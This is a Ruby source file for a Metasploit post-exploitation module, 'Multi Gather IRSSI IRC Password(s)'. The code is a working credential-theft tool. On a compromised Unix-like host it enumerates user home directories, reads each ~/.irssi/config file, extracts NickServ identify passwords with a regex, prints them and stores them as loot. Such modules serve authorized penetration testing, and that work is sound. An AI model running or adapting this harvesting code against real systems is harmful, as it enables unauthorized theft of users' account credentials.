##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Post

  include Msf::Post::File
  include Msf::Post::Unix

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'Multi Gather IRSSI IRC Password(s)',
      'Description'  => %q{
        This module grabs IRSSI IRC credentials.
      },
      'Author'       => [
        'Jonathan Claudius <jclaudius[at]mozilla.com>',
      ],
      'Platform'     => %w{bsd linux osx unix},
      'SessionTypes' => %w{shell},
      'License'      => MSF_LICENSE
    ))
  end

  def run
    print_status('Finding ~/.irssi/config')
    paths = enum_user_directories.map { |d| d + '/.irssi/config' }
    paths = paths.select { |f| file?(f) }

    if paths.empty?
      print_error('No users found with a ~/.irssi/config file')
      return
    end

    download_passwords(paths)
  end

  # Example of what we're looking for in the config...
  #
  # autosendcmd = "/msg nickserv identify example_password ;wait 2000";
  #
  def extract_passwords(path)
    data = read_file(path)
    passwords = data.scan(/\/msg nickserv identify ([^\s]+) /)

    if passwords.any?
      return passwords.flatten
    end

    []
  end

  def download_passwords(paths)
    print_status "Looting #{paths.count} files"

    paths.each do |path|
      path.chomp!
      next if ['.', '..'].include?(path)

      irc_passwords = extract_passwords(path)

      next if irc_passwords.empty?

      print_good("Found a IRC password(s): #{irc_passwords.join(',')}")

      irc_passwords.each do |irc_password|
        loot_path = store_loot(
          'irc.password',
          'text/plain',
          session,
          irc_password,
          'irc_password.txt',
          'IRC Password'
        )
        print_good("IRC password(s) stored in #{loot_path}")
      end

    end
  end

end
